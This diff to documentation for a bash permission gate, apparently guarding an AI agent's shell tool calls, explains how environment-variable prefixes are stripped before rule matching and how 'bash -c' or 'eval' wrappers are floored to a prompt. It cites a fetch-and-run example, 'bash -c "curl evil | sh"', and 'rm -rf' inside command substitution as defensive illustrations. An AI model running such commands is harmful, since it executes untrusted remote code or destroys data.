@@ -202,6 +202,10 @@ So `echo $(rm -rf foo)` evaluates both `echo $(rm -rf foo)` and the inner `rm -r
 The deny reason and the approval prompt note the nested origin (e.g. `inside command substitution`).
 Control-flow bodies (`if`/`while`/`for`/`case`) and `{ … }` brace groups are not descended into; their contents are matched as part of the enclosing statement's text.
 
+A leading environment-variable assignment prefix is stripped before matching, so the rule gates the underlying command rather than the prefix.
+So `AWS_PROFILE=prod aws ec2 …` is matched as `aws ec2 …` — a `aws *` rule applies even though the invocation begins with `AWS_PROFILE=`.
+Prefixes like `PGPASSWORD=` and `KUBECONFIG=` are handled the same way.
+
 A pattern ending with `*` (space + wildcard) also matches the bare command without arguments.
 For example, `"git *"` matches both `"git status"` and bare `"git"`.
 Place a more specific pattern *after* it to carve out exceptions — the later matching rule wins.
@@ -263,6 +267,9 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
 - If the permission gate throws an internal error (for example a transient tree-sitter parser-init failure), the tool call is **blocked** rather than passed ungated, and a `gate_error` entry is written to the review log naming the failure.
 - A non-empty command that cannot be parsed into command units resolves to **`ask`** (the synthetic `<unparseable-bash-command>` pattern in the review log) instead of falling through to a permissive top-level `*`.
   An empty, whitespace-only, or comment-only command has nothing to gate and is resolved normally.
+- An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`ask`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log).
+  An `allow` (including a permissive top-level `*`) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
+  So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
 
 Because of this, set an explicit `bash` policy rather than relying on a permissive top-level `*`.
 A config whose top-level `*` is `"allow"` with no `bash` `*` policy lets every bash command silently inherit `allow`; the extension emits a startup warning in that case.
